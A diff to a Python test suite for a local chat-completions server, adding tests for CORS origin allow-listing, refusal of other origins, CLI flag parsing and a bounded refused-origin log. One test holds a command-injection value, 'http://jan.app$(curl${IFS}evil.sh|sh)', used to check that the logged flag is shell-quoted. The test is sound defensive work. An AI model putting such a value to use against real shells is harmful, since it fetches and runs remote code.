@@ -12,6 +12,16 @@ from openai import AuthenticationError, OpenAI
 from dev.tests.test_server import FakeRuntime, Harness, Plan
 from install import launcher
 from server import server
+from server.origins import ANY_ORIGIN
+
+# The launcher's parser and the server's, each with the arguments it requires.
+PARSERS = (
+    (launcher.parse_args, ["serve", "--model", "owner/repo"]),
+    (
+        server.parse_args,
+        ["target", "draft", "--tokenizer", "tokenizer", "--model", "owner/repo"],
+    ),
+)
 
 
 class ServerAccessTests(unittest.TestCase):
@@ -145,6 +155,160 @@ class ServerAccessTests(unittest.TestCase):
         self.addCleanup(harness.close)
         return harness
 
+    def test_a_page_of_an_allowed_origin_reads_every_response(self):
+        runtime = FakeRuntime(Plan([[1, 2, 3]]), Plan([[1, 2, 3]]))
+        harness = Harness(
+            runtime, api_key="test-server-key", allowed_origins=("tauri://localhost",)
+        )
+        self.addCleanup(harness.close)
+        origin = {"Origin": "tauri://localhost"}
+        key = {
+            "Authorization": "Bearer test-server-key",
+            "Content-Type": "application/json",
+        }
+        body = {
+            "model": "test-model",
+            "messages": [{"role": "user", "content": "hello"}],
+        }
+
+        def exchange(method, headers, body=None, path="/v1/chat/completions"):
+            connection = http.client.HTTPConnection(
+                *harness.server.server_address, timeout=3
+            )
+            self.addCleanup(connection.close)
+            data = None if body is None else json.dumps(body)
+            connection.request(method, path, data, headers)
+            response = connection.getresponse()
+            return response.status, response.headers, response.read()
+
+        # The preflight a browser sends before a request with a key or a JSON
+        # body: without the key, for any header it asks about.
+        status, headers, _ = exchange(
+            "OPTIONS",
+            {
+                **origin,
+                "Access-Control-Request-Method": "POST",
+                "Access-Control-Request-Headers": "authorization, content-type",
+            },
+        )
+        self.assertEqual(status, 204)
+        self.assertEqual(
+            [
+                headers[name]
+                for name in (
+                    "Access-Control-Allow-Origin",
+                    "Vary",
+                    "Access-Control-Allow-Methods",
+                    "Access-Control-Allow-Headers",
+                    "Access-Control-Max-Age",
+                )
+            ],
+            [
+                "tauri://localhost",
+                "Origin",
+                "GET, HEAD, POST, DELETE, OPTIONS",
+                "authorization, content-type",
+                "600",
+            ],
+        )
+        # An answer, a stream and a refusal alike name the origin, and let the
+        # page read the retry and authentication hints.
+        for sent, fields, expected in (
+            ({**origin, **key}, {}, 200),
+            ({**origin, **key}, {"stream": True}, 200),
+            (origin, {}, 401),
+        ):
+            with self.subTest(fields=fields, expected=expected):
+                status, headers, data = exchange("POST", sent, {**body, **fields})
+                self.assertEqual(status, expected, data)
+                self.assertEqual(
+                    headers["Access-Control-Allow-Origin"], "tauri://localhost"
+                )
+                self.assertEqual(headers["Vary"], "Origin")
+                self.assertEqual(
+                    headers["Access-Control-Expose-Headers"],
+                    "Retry-After, WWW-Authenticate",
+                )
+                if fields:
+                    self.assertTrue(
+                        headers["Content-Type"].startswith("text/event-stream")
+                    )
+        # A page of any other origin is refused before the request is read, a
+        # preflight too, and learns nothing. The refusal names the flag, and
+        # the server prints it once, as the browser hides it from the page.
+        with mock.patch.object(server, "print_status") as printed:
+            for method, extra in (
+                ("POST", key),
+                ("OPTIONS", {"Access-Control-Request-Method": "POST"}),
+            ):
+                with self.subTest(method=method):
+                    status, headers, data = exchange(
+                        method, {"Origin": "https://other.example", **extra}, body
+                    )
+                    self.assertEqual(status, 403)
+                    self.assertIsNone(headers["Access-Control-Allow-Origin"])
+                    self.assertIn(
+                        "--allowed-origin https://other.example ",
+                        json.loads(data)["error"]["message"],
+                    )
+        printed.assert_called_once_with(
+            "Refused · Origin https://other.example · restart with "
+            "--allowed-origin https://other.example to accept it",
+            error=True,
+        )
+        # A client that is no page, and the server's own pages, get no such
+        # headers.
+        host = "%s:%s" % harness.server.server_address
+        for sent in (key, {**key, "Origin": f"http://{host}"}):
+            status, headers, _ = exchange("GET", sent, path="/v1/models")
+            self.assertEqual(status, 200)
+            self.assertIsNone(headers["Access-Control-Allow-Origin"])
+            self.assertIsNone(headers["Access-Control-Expose-Headers"])
+        self.assertEqual(len(runtime.requests), 2)
+
+    def test_every_origin_is_admitted_when_asked(self):
+        harness = self.harness(allowed_origins=("*",))
+        for origin in ("https://anywhere.example", "null"):
+            with self.subTest(origin=origin):
+                connection = http.client.HTTPConnection(
+                    *harness.server.server_address, timeout=3
+                )
+                self.addCleanup(connection.close)
+                connection.request("GET", "/v1/models", headers={"Origin": origin})
+                response = connection.getresponse()
+                response.read()
+                self.assertEqual(response.status, 200)
+                self.assertEqual(response.headers["Access-Control-Allow-Origin"], "*")
+                self.assertIsNone(response.headers["Vary"])
+                self.assertEqual(
+                    response.headers["Access-Control-Expose-Headers"],
+                    "Retry-After, WWW-Authenticate",
+                )
+
+    def test_refused_origins_are_logged_once_each_and_bounded(self):
+        log = server.RefusedOriginLog()
+        origins = [f"https://{index}.example" for index in range(log.LIMIT + 5)]
+        # An origin is printed cut to 256 characters, and a flag value a shell
+        # would run quoted.
+        origins[0] = "https://" + "a" * 300 + ".example"
+        origins[1] = "http://jan.app$(curl${IFS}evil.sh|sh)"
+        flags = [origins[0][:256], f"'{origins[1]}'", *origins[2:]]
+        with mock.patch.object(server, "print_status") as printed:
+            for origin in origins + origins:
+                log.report(origin)
+        self.assertEqual(
+            printed.call_args_list,
+            [
+                mock.call(
+                    f"Refused · Origin {origin[:256]} · restart with "
+                    f"--allowed-origin {flag} to accept it",
+                    error=True,
+                )
+                for origin, flag in zip(origins[: log.LIMIT], flags)
+            ]
+            + [mock.call("Refused · further Origins are not logged", error=True)],
+        )
+
     def test_authentication_precedes_body_parsing_and_admission(self):
         harness = self.harness(api_key="test-server-key")
         for path in (
@@ -235,21 +399,35 @@ class ServerAccessTests(unittest.TestCase):
         self.assertEqual((status, content_type), (200, "image/svg+xml"))
         self.assertTrue(ElementTree.fromstring(icon).tag.endswith("svg"))
 
-    def test_cli_key_precedence_and_validation(self):
-        for parse, arguments in (
-            (launcher.parse_args, ["serve", "--model", "owner/repo"]),
+    def test_cli_takes_origins_as_browsers_send_them(self):
+        typed = ["tauri://localhost", "http://localhost:3000", "*"]
+        flags = [flag for origin in typed for flag in ("--allowed-origin", origin)]
+        # The launcher passes the values on as typed; the server parses them.
+        for (parse, arguments), parsed in zip(
+            PARSERS,
             (
-                server.parse_args,
-                [
-                    "target",
-                    "draft",
-                    "--tokenizer",
-                    "tokenizer",
-                    "--model",
-                    "owner/repo",
-                ],
+                typed,
+                [("tauri", "localhost", None), ("http", "localhost", 3000), ANY_ORIGIN],
             ),
         ):
+            self.assertEqual(parse([*arguments, *flags]).allowed_origin, parsed)
+            self.assertEqual(parse(arguments).allowed_origin, [])
+            for origin, refusal in (
+                ("http://localhost/app", "expected a scheme and a host"),
+                ("tauri://*", "only a bare '*' admits every origin"),
+            ):
+                with (
+                    self.subTest(origin=origin),
+                    mock.patch("sys.stderr", io.StringIO()) as stderr,
+                    self.assertRaises(SystemExit),
+                ):
+                    parse([*arguments, "--allowed-origin", origin])
+                self.assertIn(
+                    f"{origin} is not an origin: {refusal}", stderr.getvalue()
+                )
+
+    def test_cli_key_precedence_and_validation(self):
+        for parse, arguments in PARSERS:
             with mock.patch.dict(os.environ, {"SPLASH_API_KEY": "environment-key"}):
                 self.assertEqual(parse(arguments).api_key, "environment-key")
                 args = parse([*arguments, "--api-key", "argument-key", "--no-webui"])
